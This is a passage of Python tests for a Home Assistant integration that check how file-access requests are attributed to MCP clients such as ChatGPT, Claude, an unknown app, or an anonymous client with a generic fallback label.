    assert (chatgpt["agent_client"], chatgpt["agent"]) == ("ChatGPT", "ChatGPT")
    assert (claude["agent_client"], claude["agent"]) == ("Claude", "Claude")
    assert chatgpt["agent_kind"] == "selora_account"


async def test_the_user_agent_names_the_app_without_an_initialize(
    hass: HomeAssistant, manager: FileAccessManager
) -> None:
    """After a restart the remembered clients are gone; ChatGPT's agent still says."""
    request = await _ask_as(hass, "openai-mcp/1.0.0", "www/a")
    assert request["agent_client"] == "ChatGPT"


async def test_an_unknown_app_keeps_its_own_name_and_none_falls_back(
    hass: HomeAssistant, manager: FileAccessManager
) -> None:
    await _initialize(hass, "HomeBot/2", "HomeBot")
    assert (await _ask_as(hass, "HomeBot/2", "www/a"))["agent_client"] == "HomeBot"

    hass.data[DOMAIN].pop("mcp_clients")
    anonymous = await _ask_as(hass, "python-httpx/0.27", "www/b")
    assert anonymous["agent_client"] is None
    assert anonymous["agent"] == "An AI assistant connected with your Selora account"
